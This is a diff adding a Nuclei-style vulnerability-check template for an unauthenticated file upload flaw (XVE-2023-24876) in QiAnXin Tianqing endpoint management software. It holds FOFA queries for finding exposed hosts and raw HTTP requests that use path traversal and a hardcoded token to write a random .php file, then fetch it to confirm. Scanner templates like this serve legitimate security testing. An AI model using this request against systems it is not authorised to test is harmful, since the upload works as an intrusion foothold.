@@ -1,0 +1,43 @@
+id: QiAnXin-tq-rptsvr-fileupload
+
+info:
+  name: 奇安信天擎rptsvr文件上传漏洞
+  author: changge
+  severity: critical
+  description: 奇安信天擎终端安全管理系统V6.7.0.4130前台文件上传漏洞(XVE-2023-24876)
+  metadata:
+    fofa-query: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
+    verified: true
+    max-request: 1
+variables:
+  file_name: "{{to_lower(rand_text_alpha(6))}}.php"
+requests:
+  - raw:
+      - |
+        POST /rptsvr/upload HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
+        Upgrade-Insecure-Requests: 1
+
+        -----------------------------55433477442814818502792421460
+        Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/{{file_name}}"
+        Content-Type: text/x-python
+
+        {{randstr}}
+        -----------------------------55433477442814818502792421460
+        Content-Disposition: form-data; name="token"
+
+        skylar_report
+        -----------------------------55433477442814818502792421460
+
+      - |
+        GET /application/api/controllers/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body_2, '{{randstr}}') && status_code_2==200"
